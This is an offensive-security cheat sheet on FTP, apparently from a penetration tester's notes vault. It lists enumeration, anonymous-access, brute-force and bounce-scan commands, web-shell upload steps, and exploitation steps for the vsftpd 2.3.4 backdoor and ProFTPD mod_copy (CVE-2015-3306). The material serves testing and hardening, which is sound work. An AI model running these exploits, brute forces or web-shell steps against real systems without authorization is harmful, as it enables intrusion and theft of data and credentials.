# FTP

#FTP #FileTransferProtocol #filetransfer

## What is FTP?
File Transfer Protocol — used to transfer files between client and server. Unencrypted by default; FTPS (explicit/implicit TLS) and SFTP (SSH-based, a different protocol — see [[Services/File Xfer/SFTP|SFTP]]) are secure alternatives.

- Port **TCP 21** — command/control channel
- Port **TCP 20** — data channel (active mode)
- Passive mode: data channel port negotiated, client-initiated (firewall-friendly)
- Anonymous login common on older/misconfigured servers
- The **daemon version is the enumeration prize** — a handful of specific builds (vsftpd 2.3.4, ProFTPD ≤ 1.3.5) are unauthenticated RCE. Banner-grab first.

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Scanning/NMAP\|NMAP]] | Version/banner (`-sV`), `ftp-anon`/`ftp-bounce`/`ftp-brute` NSE |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `ftp_version`, `anonymous`, `ftp_login`, and the vsftpd/ProFTPD exploit modules |
| [[Tools/Auth/Hydra\|Hydra]] | Online password brute force against 21 |
| [[Tools/Auth/Medusa\|Medusa]] | Alternative online brute force (`-M ftp`) |
| [[Tools/File Transfer/lftp\|lftp]] | FTPS client + recursive `mirror` download/upload |
| [[Tools/File Transfer/wget\|wget]] | Recursive anonymous download (`wget -m ftp://…`) |
| [[Tools/Web/openssl\|openssl]] | Inspect/negotiate FTPS TLS (`s_client -starttls ftp`) |

---

## FTP Client Commands

| Command | Description |
|---|---|
| `connect <host>` | Connect to FTP server |
| `open <host>` | Open connection |
| `user <username>` | Set username |
| `get <file>` | Download file from server |
| `mget <pattern>` | Download multiple files |
| `put <file>` | Upload file to server |
| `mput <pattern>` | Upload multiple files |
| `ls` / `dir` | List remote directory |
| `cd <dir>` | Change remote directory |
| `lcd <dir>` | Change local directory |
| `pwd` | Print remote working directory |
| `binary` | Switch to binary transfer mode |
| `ascii` | Switch to ASCII transfer mode |
| `status` | Show connection status and settings |
| `debug` | Toggle debug mode |
| `trace` | Toggle packet tracing |
| `passive` | Toggle passive mode |
| `verbose` | Toggle verbose mode |
| `bye` / `quit` | Disconnect |

---

## Enumeration

```bash
# Nmap scripts
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-brute -sV <target>

# Check for anonymous login
nmap -p 21 --script ftp-anon <target>

# All FTP scripts
find / -type f -name "ftp*" 2>/dev/null | grep scripts

# Metasploit
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/ftp/ftp_login
```

```bash
# Grab the banner — the daemon VERSION decides which unauth-RCE (if any) applies
nc <target> 21                       # e.g. "220 (vsFTPd 2.3.4)" or "ProFTPD 1.3.5 Server"
nmap -p 21 -sV <target>              # same, scripted
```

---

## Connect / Access

```bash
# Standard connection
ftp <target>
ftp -nv <target>  # suppress auto-login

# Anonymous login
# username: anonymous
# password: anonymous@domain.com (or anything)
ftp <target>
> anonymous
> anonymous@test.com

# Recursive download (wget)
wget -m --no-passive ftp://anonymous:anonymous@<target>

# wget all files
wget -r ftp://user:pass@<target>/
```

### SSL/TLS FTP

```bash
# Connect to FTPS
openssl s_client -connect <target>:21 -starttls ftp
openssl s_client -connect <target>:990  # Implicit FTPS

# Check cert — may contain hostname/domain
# lftp with TLS
lftp -e "set ssl:verify-certificate false" -u user,pass ftps://<target>
```

---

## Download Files

```bash
# Single file
ftp> get filename.txt

# Recursive download
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136

# All files matching pattern
ftp> mget *.txt
```

---

## Upload Files

```bash
# Upload a file
ftp> put shell.php

# Upload with binary mode (for non-text)
ftp> binary
ftp> put reverse.exe
```

---

## Windows FTP via Command File

```cmd
# Download via command file (scriptable)
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

# Upload via command file
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT C:\path\to\file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

## Attack Vectors

### Brute Force

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target>
medusa -h <target> -u admin -P passwords.txt -M ftp
nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=pass.txt <target>
```

### FTP Bounce Attack

```bash
# Use FTP server as proxy to port scan internal hosts
nmap -p 80 -b anonymous:anonymous@<ftp_host> <internal_target>
nmap -Pn -v -n -p 80 -b ftp_user:ftp_pass@<ftp_host> <internal_target>
```

### Upload Web Shell (if FTP root = web root)

```bash
ftp> put shell.php
# Then access via browser: http://<target>/shell.php?cmd=id
```

### vsftpd 2.3.4 Backdoor (CVE-2011-2523)

The vsftpd-2.3.4 source tarball was trojaned in 2011: a username ending in `:)` opens a **root** bind shell on **TCP 6200**. Unauthenticated. Confirm the version from the banner first.

```bash
# Manual trigger — login with a smiley, then connect to 6200
nc <target> 21
USER pwn:)
PASS anything
#   (login "fails", but the backdoor is now listening)
nc <target> 6200
id           # uid=0(root)

# Metasploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target>
run
```

### ProFTPD mod_copy (CVE-2015-3306)

ProFTPD ≤ 1.3.5 with `mod_copy` enabled honours `SITE CPFR` / `SITE CPTO` **without authentication** — an arbitrary server-side file copy. Chained with a co-hosted web server it's RCE: copy a PHP payload into the webroot, then request it.

```bash
# Prove the primitive (arbitrary read/copy, no login)
nc <target> 21
SITE CPFR /etc/passwd
SITE CPTO /tmp/passwd.copy

# RCE: plant a PHP payload, then copy it into the web root and hit it.
# Metasploit automates the whole plant-and-copy (needs a writable, web-served dir):
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS <target>
set SITEPATH /var/www/html      # web root the FTP daemon can write to
set TARGETURI /                 # URL path that maps to SITEPATH
run
```

> [!warning] **mod_copy RCE needs a co-hosted, FTP-writable web root.** The copy primitive works unauthenticated, but turning it into code execution requires a directory the FTP daemon can write *and* the web server will execute — commonly `/var/www/html`. Without a co-hosted web app it's still an arbitrary file read/write (e.g. drop an SSH key, read `/etc/passwd`).

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Anonymous login enabled | Unauthenticated file access/upload |
| FTP root = web root | Web shell upload leads to RCE |
| No TLS | Credentials and data in cleartext |
| Writable directories | File upload/replacement |
| `umask` too permissive | Uploaded files execute |
| vsftpd **2.3.4** running | Unauthenticated root shell (CVE-2011-2523 backdoor) |
| ProFTPD **≤ 1.3.5** with `mod_copy` | Unauth `SITE CPFR/CPTO` file copy → RCE (CVE-2015-3306) |
| FTP daemon writable into a web-served dir | mod_copy / anon upload becomes RCE |

---

## Quick Reference

| Goal | Command |
|---|---|
| Anonymous login check | `nmap -p 21 --script ftp-anon host` |
| Connect | `ftp host` or `ftp -nv host` |
| Recursive download | `wget -m --no-passive ftp://anon:anon@host` |
| Upload file | `ftp> put shell.php` |
| Brute force | `hydra -l admin -P rockyou.txt ftp://host` |
| Bounce scan | `nmap -p 80 -b anon:anon@ftphost internalhost` |
| TLS connect | `openssl s_client -connect host:21 -starttls ftp` |
| Full nmap scan | `nmap -p 21 --script ftp-anon,ftp-bounce,ftp-brute` |
| Banner / version | `nc host 21` (look for vsFTPd 2.3.4 / ProFTPD 1.3.5) |
| vsftpd 2.3.4 backdoor | `USER x:)` then `nc host 6200` → root |
| ProFTPD mod_copy RCE | `msf › exploit/unix/ftp/proftpd_modcopy_exec` |
| FTPS mirror | `lftp -e "set ssl:verify-certificate no" -u u,p ftps://host` |

---

*Created: 2026-07-13*
*Updated: 2026-08-21*
*Model: claude-opus-5*
